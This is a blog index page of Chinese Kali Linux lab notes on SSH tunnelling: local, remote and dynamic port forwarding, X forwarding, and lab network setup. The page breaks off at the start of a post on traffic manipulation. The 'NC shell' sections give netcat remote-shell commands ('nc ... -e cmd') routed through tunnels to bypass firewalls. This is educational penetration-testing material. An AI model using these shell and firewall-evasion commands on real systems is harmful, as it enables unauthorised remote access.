<!DOCTYPE html>



  


<html class="theme-next mist use-motion" lang="zh-Hans">
<head>
  <meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
<meta name="theme-color" content="#222">









<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />
















  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />







<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />

<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">


  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">





  <meta name="keywords" content="Hexo, NexT" />










<meta property="og:type" content="website">
<meta property="og:title" content="Tomas&#39;Blog">
<meta property="og:url" content="http:&#x2F;&#x2F;yoursite.com&#x2F;page&#x2F;9&#x2F;index.html">
<meta property="og:site_name" content="Tomas&#39;Blog">
<meta property="og:locale" content="zh-Hans">
<meta name="twitter:card" content="summary">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Mist',
    version: '5.1.4',
    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
    fancybox: true,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    duoshuo: {
      userId: '0',
      author: '博主'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="http://yoursite.com/page/9/"/>





  <title>Tomas'Blog</title>
  








</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">

  
  
    
  

  <div class="container sidebar-position-left 
  page-home">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/"  class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">Tomas'Blog</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <p class="site-subtitle"></p>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
            首页
          </a>
        </li>
      
        
        <li class="menu-item menu-item-tags">
          <a href="/tags/" rel="section">
            
            标签
          </a>
        </li>
      
        
        <li class="menu-item menu-item-categories">
          <a href="/categories/" rel="section">
            
            分类
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives/" rel="section">
            
            归档
          </a>
        </li>
      

      
    </ul>
  

  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            
  <section id="posts" class="posts-expand">
    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/02/01/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%85%AD%E5%8D%81%E5%85%AB)%EF%BC%9ASSH%E9%9A%A7%E9%81%93--%E5%8A%A8%E6%80%81%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E5%8F%8AX%E5%8D%8F%E8%AE%AE%E8%BD%AC%E5%8F%91/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Tomas">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/photo.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Tomas'Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2020/02/01/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%85%AD%E5%8D%81%E5%85%AB)%EF%BC%9ASSH%E9%9A%A7%E9%81%93--%E5%8A%A8%E6%80%81%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E5%8F%8AX%E5%8D%8F%E8%AE%AE%E8%BD%AC%E5%8F%91/" itemprop="url">Kali Linux笔记(六十八)：SSH隧道--动态端口转发及X协议转发</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-02-01T21:39:12+08:00">
                2020-02-01
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Kali/" itemprop="url" rel="index">
                    <span itemprop="name">Kali</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          
            <div class="post-wordcount">
              
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">字数统计&#58;</span>
                
                <span title="字数统计">
                  253 字
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                
                <span title="阅读时长">
                  1 分钟
                </span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <hr>
<h4 id="1-SSH动态端口转发"><a href="#1-SSH动态端口转发" class="headerlink" title="1. SSH动态端口转发"></a>1. SSH动态端口转发</h4><ul>
<li>本地、远程端口转发都需要固定应用服务器IP、Port<ul>
<li>应用端口繁多，逐个转发效率低</li>
<li>某些应用不固定端口</li>
<li>某些网站不支持IP直接访问，请求头需要域名</li>
<li>使用非受信网络上网保护流量不被嗅探</li>
</ul>
</li>
<li>本地侦听socks4/5代理端口<ul>
<li>由SSH server决定如何转发</li>
<li>作为翻墙代理使用</li>
<li>使用proxychains支持无代理客户端（多个代理，多节点）</li>
</ul>
</li>
<li>实验操作<ul>
<li>bodhi<ul>
<li><strong><code>🔺命令：ssh -CfNg -D 7001 root@Kali的IP地址 -p 53</code></strong>（类似GoAgent的方式）</li>
</ul>
</li>
<li>Window XP<ul>
<li>配置客户端代理（浏览器）</li>
<li>上网访问尝试（bing/baidu/taobao）</li>
</ul>
</li>
</ul>
</li>
</ul>
<p><img src="http://aliyun.wuyidaxue.top:8088/kodex/index.php?user/publicLink&fid=67ccCgTYY2xKjdBr5Soep4Lyb8kUFUVuR6pmJqKmJwDjoo_J2w7a5gO3tZJAE833fFRWjbyn9AZ7fA5W3AEvDoCfZDxHtwZ5ysvPpn60vshQhU_sP-kzjVPSMiK0_duozcf7ei79&file_name=/SSH%E5%8A%A8%E6%80%81%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91.PNG" alt="SSH动态端口转发"></p>
<h4 id="2-X协议转发"><a href="#2-X协议转发" class="headerlink" title="2. X协议转发"></a>2. X协议转发</h4><ul>
<li>远程登陆Linux GUI运行图形化界面工具<ul>
<li>VNC</li>
<li>X Window</li>
</ul>
</li>
<li>防火墙限制访问时<ul>
<li>基于SSH的X转发</li>
<li><strong><code>🔺命令：ssh -X user@1.1.1.1 -p 53</code></strong></li>
</ul>
</li>
<li>演示操作<ul>
<li>bodhi<ul>
<li><strong><code>🔺命令：ssh -X root@Kali的IP地址 -p 53</code></strong></li>
<li><strong><code>🔺命令：shell → gedit/firefox</code></strong>（Kali机器上的映射）</li>
</ul>
</li>
</ul>
</li>
</ul>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/02/01/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%85%AD%E5%8D%81%E4%B8%83)%EF%BC%9ASSH%E9%9A%A7%E9%81%93--%E8%BF%9C%E7%A8%8B%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Tomas">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/photo.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Tomas'Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2020/02/01/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%85%AD%E5%8D%81%E4%B8%83)%EF%BC%9ASSH%E9%9A%A7%E9%81%93--%E8%BF%9C%E7%A8%8B%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/" itemprop="url">Kali Linux笔记(六十七)：SSH隧道--远程端口转发</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-02-01T21:39:12+08:00">
                2020-02-01
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Kali/" itemprop="url" rel="index">
                    <span itemprop="name">Kali</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          
            <div class="post-wordcount">
              
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">字数统计&#58;</span>
                
                <span title="字数统计">
                  649 字
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                
                <span title="阅读时长">
                  2 分钟
                </span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <hr>
<h4 id="1-SSH远程端口转发"><a href="#1-SSH远程端口转发" class="headerlink" title="1. SSH远程端口转发"></a>1. SSH远程端口转发</h4><ul>
<li>由于ACL等原因，SSH与应用连接建立方向相反</li>
<li>本地端口转发<ul>
<li>SSH客户端+应用客户端位于防火墙一端</li>
<li>SSH服务端+应用服务端位于另一端</li>
</ul>
</li>
<li>远程端口转发<ul>
<li>SSH客户端、应用客户端位于防火墙两端</li>
<li>SSH服务端、应用服务端位于防火墙两端</li>
</ul>
</li>
<li>之所以称为远程，是因为SSH侦听端口开在远程的SSH Server服务上</li>
<li>侦听端口永远开在应用客户端一方</li>
<li>▲ 远程端口转发不支持网管模式</li>
</ul>
<p><img src="http://aliyun.wuyidaxue.top:8088/kodex/index.php?user/publicLink&fid=d513WCnorzA85aXbr4rDTZcFxQoIyXP5Gk_X1a6VxVrYG6QlvTJMXX9gBmQok25AFfoZ6SaCgeOPhkPhKB8GxCjeJ3G5U8oSM-c69nxe3TwblRCQ_-oYONIUYM4J11U3CfIBAf9y&file_name=/SSH%E8%BF%9C%E7%A8%8B%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91.PNG" alt="SSH远程端口转发"></p>
<h4 id="2-准备"><a href="#2-准备" class="headerlink" title="2. 准备"></a>2. 准备</h4><ul>
<li>实验机子：Linux主机/防火墙（mono）/Web服务器（KALI/2007），关闭机子的防火墙</li>
<li>Metasploit主机<ul>
<li>插入bodhi-3.2.0-64.iso光盘，用光盘启动，修改网络为Host-only方式，检查网络</li>
</ul>
</li>
<li>Mono防火墙<ul>
<li>第一个网卡为Hosy-only方式，第二个网卡为Bridge桥接方式，桥接到无线网络，检查</li>
</ul>
</li>
<li>Kali主机<ul>
<li>网卡方式为Bridge方式，桥接到无线网络，检查网络</li>
<li>修改Kali的/etc/ssh/sshd_config配置</li>
<li><strong><code>🔺命令：service ssh restart，查看SSH是否正常运行</code></strong>（<strong><code>🔺命令：netstat -pantu | grep 53</code></strong>）</li>
</ul>
</li>
<li>Window Server 2003<ul>
<li>网卡方式为Bridge方式，桥接到无线网络，检查网络</li>
</ul>
</li>
<li>bodhi主机<br> <strong><code>🔺命令：ssh -fNg -R &lt;listen port&gt;:&lt;remote ip&gt;:&lt;remote port&gt; user@&lt;SSH server&gt; -p &lt;ssh server port&gt;</code></strong> </li>
<li>Win XP主机<ul>
<li>网卡方式为Host-only方式，检查网络</li>
</ul>
</li>
</ul>
<h4 id="3-Web服务（Window-XP）"><a href="#3-Web服务（Window-XP）" class="headerlink" title="3. Web服务（Window XP）"></a>3. Web服务（Window XP）</h4><ul>
<li>Window XP <ul>
<li>安装web server（Win+R → appwiz.cpl → 更改或添加程序 → 应用程序服务器 → IIS，可能需要光盘）</li>
<li>修改Web的首页面（C:\Inetpub\wwwroot\iisstart.html）</li>
<li>访问127.0.0.1进行尝试</li>
</ul>
</li>
<li>bodhi<ul>
<li><strong><code>🔺命令：ssh -CfN -R 7001:Window XP的IP:80 root@Kali的IP -p 53</code></strong></li>
</ul>
</li>
<li>Kali<ul>
<li><strong><code>🔺命令：netstat -pantu | grep 7001</code></strong>（查看是否开启了侦听端口服务）</li>
<li>访问127.0.0.1:7001端口进行Window XP的Web服务</li>
</ul>
</li>
<li>▲ 2020.2.1 Window XP没有安装IIS的选项</li>
</ul>
<h4 id="4-远程桌面（Window-XP）"><a href="#4-远程桌面（Window-XP）" class="headerlink" title="4. 远程桌面（Window XP）"></a>4. 远程桌面（Window XP）</h4><ul>
<li>Window XP<ul>
<li>开启远程桌面，cmd修改管理员密码（<strong><code>🔺命令：net user administrator *</code></strong>）</li>
</ul>
</li>
<li>bodhi<ul>
<li><strong><code>🔺命令：ssh -CfN -R 7002:Window XP的IP:3389 root@Kali的IP -p 53</code></strong></li>
</ul>
</li>
<li>Kali<ul>
<li><strong><code>🔺命令：netstat -pantu | grep 7002</code></strong>（查看是否开启了侦听端口服务）</li>
<li>rdesktop → 127.0.0.1:7002</li>
</ul>
</li>
<li>▲ 2020.2.1 bodhi上能看到来自外网Kali的访问数据，但打不开远程桌面</li>
</ul>
<h4 id="5-NC-shell"><a href="#5-NC-shell" class="headerlink" title="5. NC shell"></a>5. NC shell</h4><ul>
<li>Window XP<ul>
<li><strong><code>🔺命令：nc -nvlp 3333</code></strong></li>
</ul>
</li>
<li>bodhi<ul>
<li><strong><code>🔺命令：ssh -CfN -L 7003:Kali的IP:3333 root@Kali的IP -p 53</code></strong></li>
</ul>
</li>
<li>Kali<ul>
<li><strong><code>🔺命令：nc 127.0.0.1 7003 -e cmd</code></strong></li>
</ul>
</li>
</ul>
<h4 id="6-SSH端口转发安全隐患"><a href="#6-SSH端口转发安全隐患" class="headerlink" title="6. SSH端口转发安全隐患"></a>6. SSH端口转发安全隐患</h4><ul>
<li>（A）&lt;–&gt;（C）以及（B）&lt;–&gt;（D）之间通信未加密，可嗅探</li>
</ul>
<p><img src="http://aliyun.wuyidaxue.top:8088/kodex/index.php?user/publicLink&fid=702dzFzcCGORO7-vBDxWaulVZGzcOhkfMDNLJKb0AvINzVF99mgrA-j6eGspEIFEII5fqDmjOy9_qk2oIG_uNIex13qrq5rJsUoSOQpYva-O7QzpjczntGnPKbjYv8zb-7pOz-BcPJ4w&file_name=/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E5%AE%89%E5%85%A8%E9%9A%90%E6%82%A3.PNG" alt="SSH端口转发安全隐患"></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/02/01/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%85%AD%E5%8D%81%E5%85%AD)%EF%BC%9ASSH%E9%9A%A7%E9%81%93--%E6%9C%AC%E5%9C%B0%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Tomas">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/photo.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Tomas'Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2020/02/01/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%85%AD%E5%8D%81%E5%85%AD)%EF%BC%9ASSH%E9%9A%A7%E9%81%93--%E6%9C%AC%E5%9C%B0%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/" itemprop="url">Kali Linux笔记(六十六)：SSH隧道--本地端口转发</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-02-01T21:39:12+08:00">
                2020-02-01
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Kali/" itemprop="url" rel="index">
                    <span itemprop="name">Kali</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          
            <div class="post-wordcount">
              
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">字数统计&#58;</span>
                
                <span title="字数统计">
                  1k 字
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                
                <span title="阅读时长">
                  4 分钟
                </span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <hr>
<h4 id="1-SSH隧道"><a href="#1-SSH隧道" class="headerlink" title="1. SSH隧道"></a>1. SSH隧道</h4><ul>
<li>SSH支持双向通信隧道<ul>
<li>将其他TCP端口的通信通过SSH链接来转发</li>
<li>用SSH作为传输层协议，对流量自动加解密</li>
<li>突破防火墙访问规则的限制，可用于翻墙</li>
</ul>
</li>
<li>本地端口转发<ul>
<li>本地侦听端口，访问转发到远程主机指定端口（SSH流量的流向/应用层流量一致）</li>
<li>使效果类似于rinetd</li>
<li>多个流量通过隧道进行转发</li>
<li>将一本地端口与远程服务器建立隧道</li>
<li>▲ SSH隧道建立侦听的端口在内网服务器，侦听的端口形象理解为外网服务器的隧道端口</li>
</ul>
</li>
<li>远程端口转发<ul>
<li>远程侦听端口，访问转发到本机主机指定端口（SSH流量的流向/应用层流量不一致）</li>
<li>▲ SSH隧道建立侦听的端口在外网服务器，侦听的端口形象理解为内网服务器的隧道端口</li>
</ul>
</li>
<li>动态隧道模式</li>
</ul>
<h4 id="2-SSH本地端口转发"><a href="#2-SSH本地端口转发" class="headerlink" title="2. SSH本地端口转发"></a>2. SSH本地端口转发</h4><ul>
<li>将一本地端口与远程服务器建立隧道</li>
<li><strong><code>🔺命令：vi /etc/ssh/sshd_config</code></strong><ul>
<li>PermitRootLogin yes</li>
<li>Port 53</li>
<li>PasswordAuthentication yes</li>
</ul>
</li>
<li>端口转发基于建立起来的SSH隧道，隧道中断则端口转发中断</li>
<li>只能在建立隧道时创建转发，不能为已有隧道增加端口转发</li>
</ul>
<p><img src="http://aliyun.wuyidaxue.top:8088/kodex/index.php?user/publicLink&fid=b2576Nwuav0PsXqAwKO6EJkQQt-bCZQN-_USzY2-HCOuTk6xNoIOWYMcoo1wt3utwS4Y0rM3s4Md4wz2kmkoO5213AEJS6csvNfVDU2QYJNL5ilAbVhnZ1frY4oJs7TjgH0lGtdv7w&file_name=/SSH%E6%9C%AC%E5%9C%B0%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%20.PNG" alt="SSH本地端口转发"></p>
<h4 id="3-准备"><a href="#3-准备" class="headerlink" title="3. 准备"></a>3. 准备</h4><ul>
<li>实验机子：Linux主机/防火墙（mono）/Web服务器（KALI/2007），关闭机子的防火墙</li>
<li>Metasploit主机<ul>
<li>插入bodhi-3.2.0-64.iso光盘，用光盘启动，修改网络为Host-only方式，检查网络</li>
</ul>
</li>
<li>Mono防火墙<ul>
<li>第一个网卡为Hosy-only方式，第二个网卡为Bridge桥接方式，桥接到无线网络，检查</li>
</ul>
</li>
<li>Kali主机<ul>
<li>网卡方式为Bridge方式，桥接到无线网络，检查网络</li>
<li>修改Kali的/etc/ssh/sshd_config配置</li>
<li><strong><code>🔺命令：service ssh restart，查看SSH是否正常运行</code></strong>（<strong><code>🔺命令：netstat -pantu | grep 53</code></strong>）</li>
</ul>
</li>
<li>Window Server 2003<ul>
<li>网卡方式为Bridge方式，桥接到无线网络，检查网络</li>
</ul>
</li>
<li>bodhi主机<ul>
<li>访问别机的WEB服务器：<strong><code>🔺命令：ssh -fCNg -L &lt;listen port&gt;:&lt;remote ip&gt;:&lt;remote port&gt; user@&lt;ssh server&gt; -p &lt;ssh server port&gt;</code></strong> <ul>
<li>-f（后台运行进程）</li>
<li>-N（不执行登陆Shell）</li>
<li>-g（服用访问时作为网管，支持多主机访问本地侦听端口）</li>
<li>-C（链接建立内容进行压缩）</li>
<li>网管模式转发RDP、NC shell</li>
</ul>
</li>
<li>访问本机的WEB服务器：<strong><code>🔺命令：ssh -fCNg -L &lt;listen port&gt;:localhost:&lt;remote port&gt; user@&lt;ssh server&gt; -p &lt;ssh port&gt;</code></strong>   </li>
</ul>
</li>
<li>Win XP主机<ul>
<li>网卡方式为Host-only方式，检查网络</li>
</ul>
</li>
</ul>
<h4 id="4-Web服务（Window-Server-2003）"><a href="#4-Web服务（Window-Server-2003）" class="headerlink" title="4. Web服务（Window Server 2003）"></a>4. Web服务（Window Server 2003）</h4><ul>
<li>Window Server 2003<ul>
<li>安装web server（Win+R → appwiz.cpl → 更改或添加程序 → 应用程序服务器 → IIS，可能需要光盘）</li>
<li>修改Web的首页面（C:\Inetpub\wwwroot\iisstart.html）</li>
<li>访问127.0.0.1进行尝试</li>
</ul>
</li>
<li>bodhi<ul>
<li><strong><code>🔺命令：ssh -CfN -L 7001:Window Server 2003的IP:80 root@Kali的IP -p 53</code></strong></li>
<li>本机访问127.0.0.1:7001进行测试，看能否访问到Window Server 2003上的Web服务</li>
</ul>
</li>
</ul>
<h4 id="5-Web服务（Kali）"><a href="#5-Web服务（Kali）" class="headerlink" title="5. Web服务（Kali）"></a>5. Web服务（Kali）</h4><ul>
<li>Kali<ul>
<li><strong><code>🔺命令：service apache2 start</code></strong>，尝试访问是否能正常访问</li>
</ul>
</li>
<li>bodhi<ul>
<li><strong><code>🔺命令：ssh -CfN -L 7002:localhost:80 root@Kali的IP -p 53</code></strong></li>
<li>本机访问127.0.0.1:7002进行测试，看能否访问到Kali上的Web服务</li>
</ul>
</li>
</ul>
<h4 id="6-远程桌面（bodhi访问）"><a href="#6-远程桌面（bodhi访问）" class="headerlink" title="6. 远程桌面（bodhi访问）"></a>6. 远程桌面（bodhi访问）</h4><ul>
<li>Window Server 2003<ul>
<li>开启远程桌面，cmd修改管理员密码（net user administrator *）</li>
</ul>
</li>
<li>bodhi<ul>
<li><strong><code>🔺命令：ssh -CfN -L 7003:Window Server 2003的IP:3389 root@Kali的IP -p 53</code></strong></li>
<li>打开mono的GUI管理界面，开启默认上网设置，下载rdesktop，测试是否能进行远程桌面登陆（Window Server 2003的远程桌面）</li>
</ul>
</li>
</ul>
<h4 id="7-远程桌面（XP访问）"><a href="#7-远程桌面（XP访问）" class="headerlink" title="7.  远程桌面（XP访问）"></a>7.  远程桌面（XP访问）</h4><ul>
<li>Window Server 2003<ul>
<li>开启远程桌面，cmd修改管理员密码（<strong><code>🔺命令：net user administrator *</code></strong>）</li>
</ul>
</li>
<li>bodhi<ul>
<li><strong><code>🔺命令：ssh -CfNg -L 7004:Window Server 2003的IP:3389 root@Kali的IP -p 53</code></strong></li>
</ul>
</li>
<li>Window XP<ul>
<li>mstsc打开远程桌面，测试是否能进行远程桌面登陆（Window Server 2003的远程桌面）</li>
</ul>
</li>
</ul>
<h4 id="8-NC-shell"><a href="#8-NC-shell" class="headerlink" title="8. NC shell"></a>8. NC shell</h4><ul>
<li>Window Server 2003<ul>
<li>装入NC程序，<strong><code>🔺命令：nc -nvlp 3333</code></strong></li>
</ul>
</li>
<li>bodhi<ul>
<li><strong><code>🔺命令：ssh -CfNg -L 7005:Window Server 2003的IP:3333 root@Kali的IP -p 53</code></strong></li>
</ul>
</li>
<li>Window XP<ul>
<li><strong><code>🔺命令：nc bodhi的IP bodhi的端口 -e cmd</code></strong></li>
</ul>
</li>
</ul>
<p><img src="http://aliyun.wuyidaxue.top:8088/kodex/index.php?user/publicLink&fid=e630gQjawynmptE7uST32xV90FsiOBna36Hlx2zFwRkEZW4dLfdtfIY2xPF-9ypurlCdwgo2RMd_lNG7qrHNzDd-yvjDVeZcr6j9xRlupPbCFGFBmhe9gqywIZrwJLak&file_name=/SSH%E9%9A%A7%E9%81%93%E5%B0%9D%E8%AF%95.PNG" alt="SSH隧道尝试"></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/01/31/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%85%AD%E5%8D%81%E4%BA%94)%EF%BC%9A%E6%B5%81%E9%87%8F%E6%93%8D%E6%8E%A7%E3%80%81%E9%87%8D%E5%AE%9A%E5%90%91/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Tomas">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/photo.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Tomas'Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2020/01/31/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%85%AD%E5%8D%81%E4%BA%94)%EF%BC%9A%E6%B5%81%E9%87%8F%E6%93%8D%E6%8E%A7%E3%80%81%E9%87%8D%E5%AE%9A%E5%90%91/" itemprop="url">Kali Linux笔记(六十五)：流量操控、重定向</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-01-31T20:47:32+08:00">
                2020-01-31
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Kali/" itemprop="url" rel="index">
                    <span itemprop="name">Kali</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          
            <div class="post-wordcount">
              
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">字数统计&#58;</span>
                
                <span title="字数统计">
                  1.1k 字
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                
                <span title="阅读时长">
                  4 分钟
                </span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <hr>
<h4 id="1-流量操控技术"><a href="#1-流量操控技术" class="headerlink" title="1. 流量操控技术"></a>1. 流量操控技术</h4><ul>
<li>Traffic manipulation technique </li>
